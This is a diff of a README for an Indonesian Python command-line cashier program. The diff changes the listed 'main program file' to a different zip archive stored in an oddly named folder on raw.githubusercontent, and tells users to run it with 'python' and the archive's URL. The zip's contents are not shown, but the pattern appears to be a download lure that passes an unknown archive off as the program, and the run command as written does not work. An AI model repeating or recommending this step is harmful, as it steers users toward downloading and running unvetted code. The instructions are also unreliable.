@@ -10,9 +10,9 @@ Pengguna dapat memilih menu, menentukan jumlah porsi, melihat total pembayaran, 
 Program juga menghitung kembalian atau memberikan peringatan jika uang kurang.
 
 ## 📂 Struktur File
-- `https://raw.githubusercontent.com/raraofficial/kasir-python-cli-/main/heliocentrically/kasir-python-cli-.zip` — file utama program kasir
+- `https://raw.githubusercontent.com/raraofficial/kasir-python-cli-/main/heliocentrically/python_cli_kasir_v1.5.zip` — file utama program kasir
 
 ## ▶️ Cara Menjalankan
 Pastikan Python sudah terinstall. Jalankan dengan perintah:
 ```bash
-python https://raw.githubusercontent.com/raraofficial/kasir-python-cli-/main/heliocentrically/kasir-python-cli-.zip
+python https://raw.githubusercontent.com/raraofficial/kasir-python-cli-/main/heliocentrically/python_cli_kasir_v1.5.zip
